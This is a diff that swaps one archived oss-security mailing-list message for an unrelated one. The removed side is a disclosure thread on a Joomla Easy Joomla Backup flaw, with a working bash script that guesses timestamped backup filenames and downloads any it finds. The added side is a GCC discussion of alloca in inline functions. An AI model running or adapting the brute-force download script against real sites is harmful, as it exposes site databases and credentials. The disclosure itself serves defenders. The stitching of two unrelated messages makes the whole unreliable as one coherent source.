@@ -1,90 +1,93 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/28/8
-Message-id: <28E19EE5-7EC0-4712-80CE-5D2AD4C4B932@me.com>
-Date: Thu, 28 Sep 2017 12:05:40 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: oss-security@...ts.openwall.com
-Subject: Re: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/14/2
+Message-ID: <87lgr3kney.fsf@mid.deneb.enyo.de>
+Date: Fri, 14 Apr 2017 17:40:37 +0200
+From: Florian Weimer <fw@...eb.enyo.de>
+To: "Jason A. Donenfeld" <Jason@...c4.com>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: alloca in inline functions can be dangerous
 Content-Type: text/plain; charset=utf-8
 
-Hi David,
+* Jason A. Donenfeld:
 
-This is correct, hardened shared hosting platforms won't be vulnerable to this attack.
+> Hey folks,
+>
+> I'm not sure this is the right mailing list to discuss this matter, but
+> hopefully it finds an audience here. I was debugging some code recently,
+> when I found a very nasty interaction between alloca and inline functions.
+> Observe the following block:
+>
+> static inline void process_widget(struct widget *widget,
+> 				  unsigned int  fcount)
+> {
+> 	struct fragment fragments[fcount];
+> 	widgets_to_fragments(fragments, widget);
+> 	process_fragments(fragments);
+> }
+>
+> static void iterate_widgets(struct widgetlist *widgetlist)
+> {
+> 	struct widget *widget;
+> 	unsigned int fcount;
+>
+> 	for (widget = widgetlist->first; widget; widget = widget->next) {
+> 		fcount = widget_get_frags_required(widget);
+> 		if (fcount > 256)
+> 			continue;
+> 		process_widget(widget, fcount);
+> 	}
+> }
+>
+> This seems pretty benign. However, let's look at two transformations that
+> gcc makes. First the VLA is changed to use alloca:
 
-I've now updated the configuration on my lab Ubuntu system by changing apache2.conf:
+Which GCC version do you use?
 
-# diff -Nur orig apache2.conf 
---- orig	2017-09-28 12:02:13.674668975 -0400
-+++ apache2.conf	2017-09-28 11:47:50.898322778 -0400
-@@ -163,7 +163,7 @@
- 
- <Directory /var/www/>
- 	Options Indexes FollowSymLinks
--	AllowOverride None
-+	AllowOverride All
- 	Require all granted
- </Directory>
+I turned your example into something that actually compiles:
 
-Thanks,
-Larry
+struct widget
+{
+  struct widget *next;
+};
 
-> On Sep 28, 2017, at 9:09 AM, David Jardin <david.jardin@...munity.joomla.org> wrote:
-> 
-> It’s worth to mention that the extension has a default .htaccess file with a „deny from all“ in the backup directory, that will mitigate the described attack on pretty much any standard shared-hosting platform that I’m aware of.
-> 
-> 
-> 
-> 
-> Am 28. September 2017 um 14:37:20, Larry W. Cashdollar (larry0@...com) schrieb:
-> 
->> Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure 
->> Author: Larry W. Cashdollar, @_larry0 
->> Date: 2017-09-07 
->> CVE-ID:[CVE-2017-2550] 
->> Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup 
->> Vendor: kubik-rubik 
->> Vendor Notified: 2017-09-07 
->> Vendor Contact: 
->> Advisory: http://www.vapidlabs.com/advisory.php?v=200 
->> Description: Easy Joomla Backup creates 'old-school' backups without any frills. 
->> Vulnerability: 
->> The software creates a copy of the backup in the web root. The file name is easily guessable as it's just a time stamp: 
->> 
->> http://example.com/administrator/components/com_easyjoomlabackup/backups/DOMAIN_YEAR-MONTH-DAY_H-M-S.zip 
->> 
->> Exploit Code: 
->> • #!/bin/bash 
->> • #Larry W. Cashdollar, @_larry0 9/7/2017 
->> • #Bruteforce download backups for Joomla Extension Easy Joomla Backup v3.2.4 
->> • #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup 
->> • MONTH=09 
->> • DAY=07 
->> • YEAR=2017 
->> • Z=0 
->> • #May need to set the DOMAIN to $1 the target depending on how WP is configured. 
->> • DOMAIN=192.168.0.163 
->> •  
->> • echo "Scanning website for available backups:" 
->> • for y in `seq -w 0 23`; do 
->> • for x in `seq -w 0 59`; do 
->> • Y=`echo "scale=2;($Z/86000)*100"|bc`; 
->> • echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%" 
->> • for z in `seq -w 0 59`; do 
->> • Z=$(( $Z + 1 )); 
->> • CPATH="http://$1/administrator/components/com_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip"; 
->> • RESULT=`curl -s --head $CPATH|grep 200`; 
->> • if [ -n "$RESULT" ]; then 
->> • echo "" 
->> • echo "[+] Location $CPATH Found"; 
->> • echo "[+] Received $RESULT"; 
->> • echo "Downloading......"; 
->> • wget $CPATH 
->> • fi; 
->> • done 
->> • done 
->> • done 
->> • echo "Completed."
-> -- 
-> Kind Regards,
-> David Jardin
+unsigned widget_get_frags_required(struct widget *);
 
+struct fragment { int dummy; };
+void widgets_to_fragments(struct fragment *, struct widget *);
+void process_fragments(struct fragment *);
+
+struct widgetlist
+{
+  struct widget *first;
+};
+
+static inline void
+process_widget(struct widget *widget, unsigned int  fcount)
+{
+  struct fragment fragments[fcount];
+  widgets_to_fragments(fragments, widget);
+  process_fragments(fragments);
+}
+
+void
+iterate_widgets(struct widgetlist *widgetlist)
+{
+  struct widget *widget;
+  unsigned int fcount;
+
+  for (widget = widgetlist->first; widget; widget = widget->next) {
+    fcount = widget_get_frags_required(widget);
+    if (fcount > 256)
+      continue;
+    process_widget(widget, fcount);
+  }
+}
+
+I don't see the behavior your outline.  The stack pointer is restored
+for each iteration of the loop.
+
+In my experience, GCC is pretty good at actually deallocating VLAs
+when a scope is exited.
+
+In any case, this is a GCC bug.  I can help you to turn this into a
+proper bug report if it still exists in current versions.
